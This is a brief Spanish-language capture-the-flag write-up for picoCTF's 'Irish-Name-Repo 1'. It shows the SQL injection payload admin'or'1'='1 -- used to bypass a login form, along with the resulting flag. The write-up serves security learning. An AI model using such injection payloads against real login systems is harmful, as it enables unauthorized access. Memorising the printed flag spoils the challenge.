# Irish-Name-Repo 1

## Objetivo 
Hay un sitio web en https://jupiter.challenges.picoctf.org/problem/39720/ (enlace) o http://jupiter.challenges.picoctf.org:39720. ¿Crees que puedes iniciar sesión con nosotros? ¡Intenta ver si puedes iniciar sesión!

## Solución 
Inyectamos el siguiente codigo SQL en la parte de usuario y password para ver como actua el sistema codificando nuestra carga util: admin'or'1'='1 --
	
# Logged in!

Your flag is: picoCTF{s0m3_SQL_c218b685}

## Notas
Al probar inyecciones de codigo podemos ver y evaluar el comportamiento de la pagina a la hora de querer acceder a alguna parte del sistema.

## Referencias